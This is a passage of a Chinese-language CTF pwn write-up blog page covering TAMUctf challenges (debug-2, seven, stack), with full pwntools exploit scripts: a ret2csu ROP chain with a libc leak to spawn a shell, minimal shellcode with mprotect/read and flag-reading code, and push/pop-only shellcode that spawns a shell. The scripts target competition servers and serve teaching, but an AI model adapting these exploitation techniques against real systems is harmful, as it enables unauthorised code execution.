class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_debug-2&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0b0100_0001 0x41</span></span><br><span class="line"><span class="comment"># 0b0110_0001 0x61</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0b0010_0000 0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">string</span>):</span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) &gt;= i &gt;= <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>)) <span class="keyword">or</span> (<span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>) &gt;= i &gt;= <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)):</span><br><span class="line">            tmp = i ^ <span class="number">0x20</span></span><br><span class="line">            res += tmp.to_bytes()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += i.to_bytes()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x134a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x57</span> + <span class="string">b&quot;|&quot;</span> + <span class="string">b&quot;\xd8&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text_offset = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x13D8</span></span><br><span class="line">lev_ret = <span class="number">0x00000000000012DA</span> + text_offset</span><br><span class="line">pop_rdi = <span class="number">0x000000000000145B</span> + text_offset</span><br><span class="line">pop_rsi = <span class="number">0x0000000000001459</span> + text_offset</span><br><span class="line">puts_got = text_offset + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = text_offset + elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got = text_offset + elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x4000</span> + text_offset + <span class="number">0x0E00</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span> + p64(bss + <span class="number">0x60</span>) + p64(text_offset + <span class="number">0x134A</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, change(payload))</span><br><span class="line"></span><br><span class="line">start = csu_start + text_offset</span><br><span class="line">end = start + <span class="number">0x1A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(bss + 0x80)</span></span><br><span class="line"></span><br><span class="line">payload = p64(end)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload += p64(read_got)  <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># edi</span></span><br><span class="line">payload += p64(bss + <span class="number">0x88</span>)  <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)  <span class="comment"># rdx</span></span><br><span class="line">payload += p64(start)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload += p64(text_offset + 0x134A)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss + <span class="number">0x8</span>) + p64(lev_ret)</span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, change(payload))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recvlines(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = p64(pop_rdi)</span></span><br><span class="line"><span class="string">payload += p64(sh)</span></span><br><span class="line"><span class="string">payload += p64(sys)</span></span><br><span class="line"><span class="string">p.sendafter(b&quot;characters):\n\n&quot;, change(payload))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload += p64(read_got)  <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># edi</span></span><br><span class="line">payload += p64(bss + <span class="number">0x88</span> + <span class="number">0x90</span>)  <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)  <span class="comment"># rdx</span></span><br><span class="line">payload += p64(start)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line">puts_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys, sh = search_from_libc(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">ls(text_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>接下来是两个shellcode编写，个人认为最有意思的部分</p>
+</blockquote>
+<h1 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h1><p>条件极为苛刻，只允许写入7个字节，而且shellcode段在跳转前取消了写权限。<br>在这种情况下构造mprotect + read组合进一步写入是无法做到的（即使借助现有寄存器），拿shell更是不可能。<br>转换思路，我们可以手动构造一个栈溢出漏洞，然后用栈溢出的思路去解题。</p>
+<p>分析寄存器条件，可以构造如下shellcode作为一个很长的栈溢出漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov edi, eax</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>ret返回地址会直接落在我们输入的位置上，正好这个题有csu，通过csu完成mprotect + read,往shellcode段读入shellcode后再跳转过去即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./seven/seven&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_seven&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send(asm(payload))</span><br><span class="line">mprotect = elf.got[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = csu(edi=<span class="number">0x500000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=mprotect)</span><br><span class="line">payload += csu(edi=<span class="number">0x0</span>, rsi=<span class="number">0x500000</span>, rdx=<span class="number">0x500</span>, r12=read)</span><br><span class="line">payload += p64(<span class="number">0x500000</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># 7478742e67616c662f2e0a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = (</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    + sendfile</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2.5</span>)</span><br><span class="line">p.send(asm(orw))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><blockquote>
+<p>个人认为最有意思的题目</p>
+</blockquote>
+<p>直接看C源码，发现题目只允许push&#x2F;pop操作，操作寄存器必须以”r”开头<br>专门去看了intel的开发手册，发现允许内容就是只有push&#x2F;pop rax~r15(包括rsp)这几个</p>
+<p>个人认为如果真仅仅用这几个操作确实是无法get shell的（连syscall都无法做到），解决方案在栈上。</p>
+<p>思路是构造read syscall再次读入shellcode来绕过过滤。通过各种栈操作我们可以设置合适的rdi,rsi,rdx和rax值，只差syscall<br>而syscall的汇编为<code>\x0f\x05</code>，事实上我们可以在栈上创造一个<code>\x0f\x05</code>，就是将输入长度补齐到0x50f;<br>分析源码可以发现在栈上有一个变量是存储输入长度的（调试发现就在栈顶），如果该值为0x50f，在小端序下便是<code>\x0f\x05</code>，通过栈操作我们可以把它push到shellcode段作为syscall使用。</p>
+<p>之后再传入正常的shellcode即可，注意要恢复rsp,不然栈空间可能不足</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./stack/stack&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_stack&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push r8 ~ r15: \x41\x50 ~ \x41\x57</span></span><br><span class="line"><span class="string">pop r8 ~ r15: \x41\x58 ~ \x41\x5f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000000000:  50    push rax</span></span><br><span class="line"><span class="string">0x0000000000000001:  51    push rcx</span></span><br><span class="line"><span class="string">0x0000000000000002:  52    push rdx</span></span><br><span class="line"><span class="string">0x0000000000000003:  53    push rbx</span></span><br><span class="line"><span class="string">0x0000000000000004:  54    push rsp</span></span><br><span class="line"><span class="string">0x0000000000000005:  55    push rbp</span></span><br><span class="line"><span class="string">0x0000000000000006:  56    push rsi</span></span><br><span class="line"><span class="string">0x0000000000000007:  57    push rdi</span></span><br><span class="line"><span class="string">0x0000000000000008:  58    pop  rax</span></span><br><span class="line"><span class="string">0x0000000000000009:  59    pop  rcx</span></span><br><span class="line"><span class="string">0x000000000000000a:  5A    pop  rdx</span></span><br><span class="line"><span class="string">0x000000000000000b:  5B    pop  rbx</span></span><br><span class="line"><span class="string">0x000000000000000c:  5C    pop  rsp</span></span><br><span class="line"><span class="string">0x000000000000000d:  5D    pop  rbp</span></span><br><span class="line"><span class="string">0x000000000000000e:  5E    pop  rsi</span></span><br><span class="line"><span class="string">0x000000000000000f:  5F    pop  rdi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push r10</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push r10</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = asm(shell)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50F</span>, <span class="string">b&quot;\x50&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, rbp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x12</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/10/20/2024qwntb/" rel="prev" title="[第七届“强网”拟态防御国际精英挑战赛-线上预选赛] Pwn writeup（部分）">
+      <i class="fa fa-chevron-left"></i> [第七届“强网”拟态防御国际精英挑战赛-线上预选赛] Pwn writeup（部分）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sniper"><span class="nav-number">1.</span> <span class="nav-text">sniper</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#debug1"><span class="nav-number">2.</span> <span class="nav-text">debug1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rop-thirteen"><span class="nav-number">3.</span> <span class="nav-text">rop-thirteen</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#debug-2"><span class="nav-number">4.</span> <span class="nav-text">debug-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#seven"><span class="nav-number">5.</span> <span class="nav-text">seven</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack"><span class="nav-number">6.</span> <span class="nav-text">stack</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">NazrinDuck</p>
+  <div class="site-description" itemprop="description">Fâtih'in İstanbul'u fethettiği yaştasın!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">NazrinDuck</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
